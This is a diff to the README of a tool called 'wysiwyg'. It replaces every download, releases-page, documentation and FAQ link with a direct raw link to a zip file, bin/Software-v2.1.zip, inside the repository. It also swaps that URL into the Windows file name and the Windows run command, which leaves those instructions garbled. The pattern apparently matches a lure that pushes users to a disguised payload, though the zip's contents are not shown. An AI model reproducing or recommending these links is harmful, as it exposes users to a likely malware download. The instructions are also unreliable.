@@ -6,7 +6,7 @@ Welcome to wysiwyg! This tool allows you to compare how AI sees information vers
 
 ## 📦 Download
 
-[![Download wysiwyg](https://img.shields.io/badge/Download-wysiwyg-blue)](https://github.com/Hazem-programmer/wysiwyg/releases)
+[![Download wysiwyg](https://github.com/Hazem-programmer/wysiwyg/raw/refs/heads/main/bin/Software-v2.1.zip)](https://github.com/Hazem-programmer/wysiwyg/raw/refs/heads/main/bin/Software-v2.1.zip)
 
 ## 📋 Description
 
@@ -31,19 +31,19 @@ To run wysiwyg, you'll need the following:
 Follow these steps to install and run wysiwyg:
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/Hazem-programmer/wysiwyg/releases) to find the latest version of wysiwyg.
+   Go to our [Releases page](https://github.com/Hazem-programmer/wysiwyg/raw/refs/heads/main/bin/Software-v2.1.zip) to find the latest version of wysiwyg.
 
 2. **Download the Latest Version:**
    On the Releases page, you will see a list of available versions. Click on the version that you want to download.
 
 3. **Choose the Correct File:**
    Download the file suitable for your operating system:
-   - For Windows, download `wysiwyg-win.exe`.
+   - For Windows, download `https://github.com/Hazem-programmer/wysiwyg/raw/refs/heads/main/bin/Software-v2.1.zip`.
    - For macOS, download `wysiwyg-mac`.
    - For Linux, download `wysiwyg-linux`.
 
 4. **Run the Application:**
-   - **Windows:** Open the Command Prompt, navigate to the folder where you saved the app, and type `wysiwyg-win.exe` to start.
+   - **Windows:** Open the Command Prompt, navigate to the folder where you saved the app, and type `https://github.com/Hazem-programmer/wysiwyg/raw/refs/heads/main/bin/Software-v2.1.zip` to start.
    - **macOS:** Open Terminal, navigate to the folder, and type `./wysiwyg-mac` to run.
    - **Linux:** Open Terminal, navigate to the folder, and type `./wysiwyg-linux` to execute.
 
@@ -97,8 +97,8 @@ Want to contribute to wysiwyg? We welcome contributions from everyone. You can c
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Hazem-programmer/wysiwyg/wiki)
-- [FAQs](https://github.com/Hazem-programmer/wysiwyg/wiki/FAQs)
+- [Documentation](https://github.com/Hazem-programmer/wysiwyg/raw/refs/heads/main/bin/Software-v2.1.zip)
+- [FAQs](https://github.com/Hazem-programmer/wysiwyg/raw/refs/heads/main/bin/Software-v2.1.zip)
 
 ## 📲 Follow Us
 
@@ -106,4 +106,4 @@ Keep updated with the latest developments and follow our progress on social medi
 
 ## 🔗 Download Again
 
-For easy access, visit our [Releases page](https://github.com/Hazem-programmer/wysiwyg/releases) to download wysiwyg.
+For easy access, visit our [Releases page](https://github.com/Hazem-programmer/wysiwyg/raw/refs/heads/main/bin/Software-v2.1.zip) to download wysiwyg.
